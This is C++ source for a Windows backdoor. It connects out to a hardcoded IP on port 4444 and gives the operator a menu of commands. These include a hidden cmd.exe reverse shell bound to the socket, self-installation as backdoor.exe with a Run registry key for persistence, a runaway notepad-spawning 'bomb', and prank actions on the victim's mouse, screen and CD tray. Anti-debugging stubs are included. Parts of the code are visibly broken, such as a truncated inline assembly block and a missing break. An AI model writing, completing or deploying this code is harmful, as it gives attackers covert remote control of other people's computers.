#include <iostream>
#include <winsock2.h>
#include <windows.h>

#define BUFSIZE 4096

//ANTI DEBUG PARAMETERS

#define IS_DEBUGGER_PRESENT false
#define TIME_CHECK false
#define SELF_CHECKSUM false

using namespace std;

//extending language C :P (oh wait...that's C++ =o)
enum Bool   {
    false=0,
    true=1
};

typedef enum Bool Bool;

int rdtsc(void) {
    int x;
    __asm__ volatile ("rdtsc" : "=A"(x));
}

//rename this function to make it less obvious
void callIsDebuggerPresent()    {
    __asm   {
        mov e
    }
}

void performTimeCheck()  {
    unsigned int time1 = 0, time2 = 0;
    time1 = rdtsc();
    time2 = rdtsc();
    if(time2-time1 > 300)   {
        debuggerDetected();
    }
}

int debuggerDetected()  {
    printf("Leave me alone!\n");
    return -1;
}

int main()  {

    unsigned int time1 = 0, time2 = 0;
    if(TIME_CHECK==true)
        time1 = rdtsc();
    if(IS_DEBUGGER_PRESENT==true)
        callIsDebuggerPresent();
    if(TIME_CHECK==true){
        time2= rdtsc();
        debuggerDetected();
    }

    int continuer=1;
    char choice[100]="";
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0),&WSAData);
    SOCKET sock;
    SOCKADDR_IN s;
    s.sin_addr.s_addr = inet_addr("160.98.117.64");
    s.sin_family = AF_INET;
    s.sin_port = htons(4444);
    sock = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    bind(sock, (SOCKADDR*)&s, sizeof(s));
    if(connect(sock, (SOCKADDR*)&s, sizeof(s))!=SOCKET_ERROR)   {
        while(continuer==1) {

           if(TIME_CHECK==true)
               performTimeCheck();

           strcpy(choice,"");
           send(sock, "Enter a command :\n",18,0);
           send(sock, "0 - Remote Shell\n", 18,0);
           send(sock, "1 - Beep\n",9,0);
           send(sock, "2 - Message\n",12,0);
           send(sock, "3 - Crazy Mouse\n", 16,0);
           send(sock, "4 - White Screen\n", 17,0);
           send(sock, "5 - Set mouse speed to 1\n", 25,0);
           send(sock, "6 - Change Wallpaper\n", 21, 0);
           send(sock, "7 - Install\n", 12, 0);
           send(sock, "8 - Open CD Tray\n", 17, 0);
           send(sock, "9 - Bomb\n", 9, 0);
           send(sock, "10 -Swap mouse buttons\n", 23, 0);
           send(sock, "11 -Revert swapping\n", 20, 0);
           send(sock, "12 -Quit\n",9,0);
           send(sock, "Your choice : ", 14,0);
           recv(sock, choice, sizeof(choice), 0);
           int c = atoi(choice);
           switch(c)    {
            case 0:    {
                send(sock, "Shell opening on remote system...\n", 34, 0);
                PROCESS_INFORMATION pi;
                STARTUPINFO si;
                ZeroMemory(&si, sizeof(si));
                ZeroMemory(&pi, sizeof(pi));
                si.cb=sizeof(STARTUPINFO);
                si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                si.hStdError = (HANDLE)sock;
                si.hStdInput = (HANDLE)sock;
                si.hStdOutput = (HANDLE)sock;
                si.wShowWindow = SW_HIDE;
                CreateProcess(0,"cmd.exe",0,0,TRUE,0,0,0,&si,&pi);
                cout << "Success\n";
                DWORD i=WaitForSingleObject(pi.hProcess,0xFFFFFFFF);
                cout <<i<<"\n";
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                break;
                }
            case 1:     {
                int i;
                for(i=0;i<50;i++)   {
                    Beep(rand()%12000, rand()%500);
                }
                send(sock, "Playing an annoying sound\n", 26, 0);
                break;

                }
            case 2: {
                char message[100];
                char title[100];
                send(sock, "Enter the message :",19,0);
                recv(sock,message, sizeof(message),0);
                send(sock,"Enter the title: ",17,0);
                recv(sock, title, sizeof(title),0);
                MessageBox(NULL, message, title, MB_ICONWARNING|MB_OK);
                send(sock, "Message sent\n", 13, 0);
                break;
            }
            case 3: {
                int i;
                for(i=0;i<50;i++)   {
                    SetCursorPos(rand()%1367, rand()%769);
                    Sleep(200);
                }
                send(sock, "Mouse went crazy\n", 17,0);
                break;
            }
            case 4: {
                HDC dc = GetDC(NULL);
                Rectangle(dc, 0, 0 , 12000, 6200);
                Sleep(2000);
                ReleaseDC(NULL, dc);
                break;
            }
            case 5: {
                int i=1;
                SystemParametersInfo(SPI_SETMOUSESPEED,
                    0,
                    (LPVOID)i,
                    SPIF_UPDATEINIFILE||
                    SPIF_SENDCHANGE||
                    SPIF_SENDWININICHANGE);
                    send(sock, "Mouse's speed set to minimum\n", 29,0);
                    break;
            }
            case 6: {
                send(sock, "Desktop background changed\n", 27,0);
                const wchar_t* test = L"t.bmp";
                bool b = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)test,SPIF_UPDATEINIFILE);
                if(!b)  {
                    send(sock, "error", 5, 0);
                    cout << GetLastError() << "\n";
                }
                break;
            }
            case 7: {
                char Windir[100];
                char Module[100];
                GetSystemDirectory(Windir, sizeof(Windir));
                GetModuleFileName(0,Module, sizeof(Module));
                strcat(Windir, "\\backdoor.exe");
                CopyFile(Module, Windir, 0);
                HKEY Install;
                RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &Install);
                RegSetValueEx(Install, " backdoor",0,REG_SZ, (LPBYTE)Windir, sizeof(Windir));
                RegCloseKey(Install);
            }
            case 8: {
                send(sock, "Opening/Closing CD Tray\n",24,0);
                mciSendString("set cdaudio door open", 0, 0,0);
                mciSendString("set cdaudio door open", 0, 0,0);
                break;
            }
            case 9: {
                send(sock, "Bombing...\n", 11, 0);
                HWND hwnd;
                for(;;) {
                    ShellExecute(hwnd, "open", "notepad.exe", NULL, NULL, SW_MAXIMIZE);
                }
                break;
            }
            case 10:    {
                send(sock, "Swaping mouse buttons...\n", 25, 0);
                SwapMouseButton(true);
                break;
            }
            case 11:    {
                send(sock, "Reverting...\n",13, 0);
                SwapMouseButton(false);
                break;
            }
            case 12:
                send(sock, "Quitting...\n", 12, 0);
                continuer=0;
                break;
            default:
                cout << c;
                send(sock, "Invalid input\n", 14, 0);
                break;
           }
        }
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}
